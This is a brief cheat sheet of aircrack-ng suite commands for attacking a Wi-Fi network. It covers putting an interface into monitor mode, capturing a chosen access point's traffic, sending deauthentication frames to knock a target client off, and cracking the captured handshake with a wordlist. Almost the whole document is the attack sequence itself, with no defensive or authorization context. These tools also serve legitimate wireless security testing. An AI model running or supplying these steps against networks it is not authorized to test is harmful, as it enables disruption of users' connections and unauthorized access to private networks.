## Airmon-ng 

sudo airmon-ng   // check interfaces

sudo airmon-ng check kill // kill processes

sudo airmon-ng start <interface> // start monitor mode

## Airodump-ng 

sudo airodump-ng <interface> // see all available networks

sudo airodump-ng -c <channel> --bssid <mac of access point> <interface> -w <name of file> 

## Aireplay-ng 

sudo aireplay-ng -0 <number of deauth> -b <bssid> -c <target mac>

## Aircrack-ng 

sudo aircrack-ng -b <bssid> <pcap file>  -w <wordlist>
